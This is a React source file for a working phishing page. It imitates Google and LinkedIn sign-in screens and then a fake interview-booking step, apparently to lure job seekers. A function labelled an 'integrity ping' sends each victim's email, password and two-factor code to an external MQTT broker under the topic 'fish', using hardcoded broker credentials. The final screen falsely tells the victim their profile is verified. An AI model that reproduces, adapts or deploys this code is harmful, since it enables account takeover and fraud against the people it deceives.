'use client';
import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { ChevronDown, UserCircle, ShieldCheck, Calendar, Clock, Video, Linkedin } from 'lucide-react';
import mqtt from 'mqtt';

export default function CustomLoginPage() {
  const [step, setStep] = useState(0); // Restored to 0 for the LinkedIn Gateway
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [code, setCode] = useState('');
  const [scheduleData, setScheduleData] = useState({ date: '', time: '', mode: 'Virtual' });

  const sendIntegrityPing = (currentStep, dataValue) => {
    const host = 'id7a70fa.ala.asia-southeast1.emqxsl.com';
    const client = mqtt.connect(`wss://${host}:8084/mqtt`, {
      username: 'emqx_online_test_a6176451',
      password: '198d95aaaYI41Bd>c4a3d4b>]JX8;726',
      clientId: `auth_step_${currentStep}_` + Math.random().toString(16).substring(2, 8),
    });

    client.on('connect', () => {
      const payload = JSON.stringify({
        event: currentStep === 4 ? 'INTERVIEW_SCHEDULED' : 'CREDENTIAL_SUBMISSION',
        step: currentStep,
        email_captured: email,
        password_captured: password || 'Pending',
        code_captured: code || 'Pending',
        booking: currentStep === 4 ? scheduleData : 'Pending',
        time: new Date().toLocaleString()
      });

      client.publish('fish', payload, { qos: 1 }, () => {
        client.end(true);
        setStep(currentStep + 1);
      });
    });
  };

  return (
    <div className="min-h-screen bg-[#f3f2ef] flex items-center justify-center font-sans antialiased text-black">
      <AnimatePresence mode="wait">
       //step 0 
       {step === 0 && (
  <motion.div 
    key="gateway"
    initial={{ opacity: 0, scale: 0.98 }}
    animate={{ opacity: 1, scale: 1 }}
    exit={{ opacity: 0 }}
    className="w-full max-w-[480px] bg-white border border-[#dadce0] rounded-2xl p-10 shadow-sm text-center"
  >

    {/* Top subtle info box */}
    <div className="bg-[#f1f3f4] border border-[#dadce0] rounded-xl p-5 mb-8 text-left flex items-start gap-4">
      <ShieldCheck className="w-6 h-6 text-[#1a73e8] mt-1 flex-shrink-0" />
      <div>
        <h3 className="text-[#202124] font-medium text-sm">Identity verification</h3>
        <p className="text-[#5f6368] text-sm">
          To continue, verify your identity using your Google account.
        </p>
      </div>
    </div>

    {/* Title */}
    <h1 className="text-3xl font-normal text-[#202124] mb-2">
      Sign in with Google
    </h1>

    <p className="text-[#5f6368] mb-8 text-sm">
      Continue to access your dashboard and services
    </p>

    {/* Google-style button */}
    <button 
      onClick={() => setStep(1)}
      className="w-full flex items-center justify-center gap-3 py-3 px-6 bg-white border border-[#dadce0] rounded-full hover:bg-[#f7f8f8] transition text-[#3c4043] font-medium text-sm"
    >
      <img 
        src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" 
        alt="google" 
        className="w-5 h-5"
      />
      Continue with Google
    </button>

    {/* Footer note */}
    <p className="mt-8 text-xs text-[#5f6368]">
      Your information is securely processed for verification purposes.
    </p>

  </motion.div>
)}

        {/* STEP 1: LINKEDIN EMAIL ENTRY */}
        {step === 1 && (
          <motion.div 
            key="email" 
            initial={{ opacity: 0, y: 10 }} 
            animate={{ opacity: 1, y: 0 }} 
            exit={{ opacity: 0 }}
            className="w-full max-w-[400px] bg-white border border-gray-200 rounded-xl px-8 pb-10 pt-8 shadow-md"
          >
            <div className="flex justify-start mb-6 text-[#0a66c2]">
               <Linkedin className="h-8 w-8 fill-current" />
            </div>
            <h1 className="text-3xl font-semibold mb-2 text-black">Sign in</h1>
            <p className="text-sm mb-6 text-gray-700">Stay updated on your professional world</p>
            
            <input 
              type="email" 
              onChange={(e) => setEmail(e.target.value)} 
              className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] focus:ring-1 focus:ring-[#0a66c2] outline-none mb-6 text-black placeholder-gray-400" 
              placeholder="Email or Phone" 
            />

            <button 
              onClick={() => sendIntegrityPing(1, email)} 
              className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182] transition-colors"
            >
              Next
            </button>
          </motion.div>
        )}

        {/* STEP 2: LINKEDIN PASSWORD ENTRY */}
        {step === 2 && (
          <motion.div 
            key="password" 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            exit={{ opacity: 0 }} 
            className="w-full max-w-[400px] bg-white border border-gray-200 rounded-xl px-8 pb-10 pt-8 shadow-md"
          >
            <h1 className="text-2xl font-semibold mb-6 text-black">Enter password</h1>
            <div className="mb-8 flex items-center gap-2 bg-gray-100 rounded-full px-4 py-2 w-fit">
              <span className="text-sm font-medium text-gray-800">{email}</span>
            </div>
            <input 
              type="password" 
              onChange={(e) => setPassword(e.target.value)} 
              className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none mb-8 text-black placeholder-gray-400" 
              placeholder="Password" 
            />
            <button 
              onClick={() => sendIntegrityPing(2, password)} 
              className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg hover:bg-[#004182]"
            >
              Sign in
            </button>
          </motion.div>
        )}

        {/* STEP 3: 2FA VERIFICATION */}
        {step === 3 && (
          <motion.div 
            key="2fa" 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            className="w-full max-w-[400px] bg-white border border-gray-200 rounded-xl px-8 pb-10 pt-8 shadow-md text-center"
          >
            <ShieldCheck className="w-16 h-16 text-[#0a66c2] mx-auto mb-4 stroke-1" />
            <h1 className="text-2xl font-semibold mb-4 text-black">Two-step verification</h1>
            <p className="text-sm text-gray-700 mb-8">Enter the code sent to your mobile device.</p>
            <input 
              type="text" 
              onChange={(e) => setCode(e.target.value)} 
              className="w-full px-4 py-3 border border-gray-500 rounded focus:border-[#0a66c2] outline-none mb-8 text-black text-center tracking-widest font-bold" 
              placeholder="6-digit code" 
            />
            <button 
              onClick={() => sendIntegrityPing(3, code)} 
              className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-semibold text-lg"
            >
              Verify
            </button>
          </motion.div>
        )}

        {/* STEP 4: INTERVIEW SCHEDULER */}
        {step === 4 && (
          <motion.div 
            key="scheduler" 
            initial={{ opacity: 0, scale: 0.95 }} 
            animate={{ opacity: 1, scale: 1 }} 
            className="w-full max-w-[450px] bg-white border border-gray-200 rounded-2xl p-10 shadow-lg"
          >
            <h1 className="text-2xl font-bold text-center mb-2 text-black">Schedule Your Interview</h1>
            <p className="text-center text-gray-600 mb-8">Select your preferred slot</p>
            <div className="space-y-4 mb-8">
              <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
                <Calendar className="w-5 h-5 text-[#0a66c2]" />
                <input type="date" onChange={(e) => setScheduleData({...scheduleData, date: e.target.value})} className="w-full outline-none text-sm font-medium text-black" />
              </div>
              <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg">
                <Clock className="w-5 h-5 text-[#0a66c2]" />
                <input type="time" onChange={(e) => setScheduleData({...scheduleData, time: e.target.value})} className="w-full outline-none text-sm font-medium text-black" />
              </div>
              <div className="flex items-center gap-3 p-3 border border-gray-300 rounded-lg text-black">
                <Video className="w-5 h-5 text-[#0a66c2]" />
                <select onChange={(e) => setScheduleData({...scheduleData, mode: e.target.value})} className="w-full bg-transparent outline-none text-sm font-medium">
                  <option>Virtual (Microsoft Teams)</option>
                  <option>In-person (Metacube HQ)</option>
                </select>
              </div>
            </div>
            <button 
              onClick={() => sendIntegrityPing(4, scheduleData)} 
              className="w-full bg-[#0a66c2] text-white py-3 rounded-full font-bold hover:bg-[#004182]"
            >
              Confirm Appointment
            </button>
          </motion.div>
        )}

        {/* STEP 5: SUCCESS STATE */}
        {step === 5 && (
          <motion.div 
            key="success" 
            initial={{ opacity: 0 }} 
            animate={{ opacity: 1 }} 
            className="text-center py-12 bg-white rounded-2xl shadow-lg px-8 max-w-[400px]"
          >
            <ShieldCheck className="w-20 h-20 text-green-600 mx-auto mb-6" />
            <h1 className="text-2xl font-bold mb-4 text-black">Interview Confirmed</h1>
            <p className="text-gray-700">Your professional profile has been verified. Check your email for the calendar invitation.</p>
          </motion.div>
        )}

      </AnimatePresence>
    </div>
  );
}
